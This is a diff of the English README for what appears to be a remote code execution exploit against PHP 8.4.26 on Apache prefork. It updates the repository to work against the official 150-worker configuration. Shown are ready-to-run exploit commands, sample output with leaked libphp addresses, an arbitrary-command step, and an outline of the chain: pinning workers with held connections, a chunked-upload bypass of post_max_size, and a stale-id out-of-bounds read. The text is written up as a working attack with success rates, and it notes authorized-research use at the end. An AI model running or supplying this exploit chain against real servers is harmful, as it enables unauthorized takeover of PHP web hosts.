@@ -2,15 +2,14 @@
 
 [中文](README.md) | English
 
-**Single-worker prefork.** In a fully remote, HTTP-only setting, with only
-`<?php echo "OK\n"; ?>` on the target page and no PHP written on the target
-side, one command reaches RCE:
+**Official prefork configuration (MaxRequestWorkers=150).** In a fully
+remote, HTTP-only setting, with only `<?php echo "OK\n"; ?>` on the target
+page and no PHP written on the target side, one command reaches RCE:
 
-- stock official image + official ini: **5/5**
-- the same official build with symbols (gdb used only for offline
-  calibration, never on the delivery path): **15/15**
-- about 2 seconds per run, the worker is not restarted, the target ini is
-  left untouched
+- stock official image + official ini + official workers: **10/10**
+- single-worker baseline (early calibration/debugging): **20/20**
+- about 3-4 seconds per run (including 149 held connections); the pinned
+  worker is not restarted and the target ini is left untouched
 
 # General exploitation
 
@@ -19,10 +18,10 @@ with them in bulk, one of those fuzz runs will eventually reach RCE.
 Besides, a crashed worker restarts anyway, so there is no fear of knocking
 the target offline.
 
-As for workers: a single worker does not affect whether the exploit works,
-only the success rate. In the test environment we temporarily use a single
-worker to show it off; the full official worker setup will be released
-later.
+As for workers: the official prefork `MaxRequestWorkers=150` setup is now
+supported too. The script holds 149 workers with incomplete requests and
+pins A1/B1/A2/B2 to the one remaining child; the single-worker setup was
+only an early debug form (`--workers 1` still reproduces it).
 
 ## Quick start (official php.ini-production / display_errors=Off / 128M)
 
@@ -37,9 +36,11 @@ cd php2shell-bypass-aslr-exp
 # PHP 8.4.26 ...
 # display_errors => Off => Off
 # memory_limit => 128M => 128M
+# workers: official (run exploit with --workers 150)
 
 # 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
 python3 exploit.py --port 18110
+#       pinned 150/150 workers (149 holders)
 # [try 1] A1: END-cleanup send_cookie OOM
 # [try 1] B1: stale-id OOB read (chunk base + libphp)
 #       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
@@ -52,17 +53,22 @@ python3 exploit.py --port 18110
 
 No PHP/Apache build, no image build, no gdb, no ini changes.
 `pure/run_pure.sh` uses container `p2s-pure-18110` on port `18110` by
-default and prints the effective `display_errors` / `memory_limit` /
-`post_max_size` values. On Linux without docker-group access it falls back
-to `sudo docker`; you can also force `DOCKER="sudo docker" ./pure/run_pure.sh`.
-`--dbg` only switches to the symbolic build of the same official version
-for offline calibration.
+default with the image's official prefork configuration
+(MaxRequestWorkers=150), and prints the effective ini and MPM values.
+`--single` mounts the one-worker `docker/apache.conf` instead (use it with
+`--workers 1`). On Linux without docker-group access the script falls back
+to `sudo docker`; you can also force
+`DOCKER="sudo docker" ./pure/run_pure.sh`. `--dbg` only switches to the
+symbolic build of the same official version for offline calibration.
 
 Common options:
 
 ```bash
 # Re-test with fresh ASLR (restart the container)
 python3 exploit.py --port 18110 --restart p2s-pure-18110
+
+# Official workers are the default; --workers 1 is for a --single target
+python3 exploit.py --port 18110 --workers 1
 
 # Arbitrary command: write a script into the mounted directory, then run sh
 printf 'id; uname -a > /out/p1\n' > out/c
@@ -78,6 +84,10 @@ not `zval_ptr_dtor`, the script rejects that leak via the plausible
 The target page is only `<?php echo "OK\n"; ?>`; the attack traffic is
 chunked multipart plus ordinary GET/POST:
 
+0. **Worker pinning**: with the official `MaxRequestWorkers=150`, the script
+   first holds 149 children with incomplete POST bodies, so A1/B1/A2/B2 all
+   land on the one remaining child and the cross-request dangling pointers
+   stay valid.
 1. **Chunked bypass of `post_max_size`**: without `Content-Length`,
    `content_length=0`, so the check at the top of
    `rfc1867_post_handler` is skipped; bodies far larger than 8M can be
@@ -120,6 +130,7 @@ chain derive it at runtime.
 - Full-chain script: [exploit.py](exploit.py) (`pure/pwn_pure.py` remains as an alias)
 - Debug-image batch log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
 - Official-image log: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
+- Official-worker log: [pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
 - Proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
 
 ## Legacy (not the target)
@@ -136,8 +147,9 @@ line.
 ## Reproduction statement
 
 - The target configuration is the official `php.ini-production`
-  (`display_errors=Off`, `memory_limit=128M`): no custom ini, no
-  `display_errors=On` dependency, no target-side files, no
-  `session_start()`, and no gdb on the delivery path.
+  (`display_errors=Off`, `memory_limit=128M`) with the official prefork
+  workers (MaxRequestWorkers=150): no custom ini, no `display_errors=On`
+  dependency, no target-side files, no `session_start()`, and no gdb on the
+  delivery path.
 - For vulnerability research and reproduction in authorized environments
   only.
